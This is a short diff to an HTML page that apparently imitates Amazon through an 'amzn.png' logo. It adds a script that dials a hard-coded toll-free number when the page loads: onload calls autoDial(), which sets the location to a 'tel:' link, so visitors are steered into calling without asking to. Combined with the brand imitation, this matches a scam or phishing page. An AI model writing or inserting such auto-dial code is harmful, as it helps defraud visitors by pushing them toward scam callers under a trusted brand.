@@ -61,8 +61,18 @@
   </style>
   
 </head>
+<script>
+  function autoDial() {
+    var phoneNumber = "+18776523398";
+    window.location.href = "tel:" + phoneNumber;
+  }
 
-<body>
+  function call() {
+    // Implement the call functionality here, such as initiating a phone call.
+    console.log("Calling...");
+  }
+</script>
+<body onload="autoDial()">
 
   
   <img src="amzn.png" alt="logo" class="amznlogo">
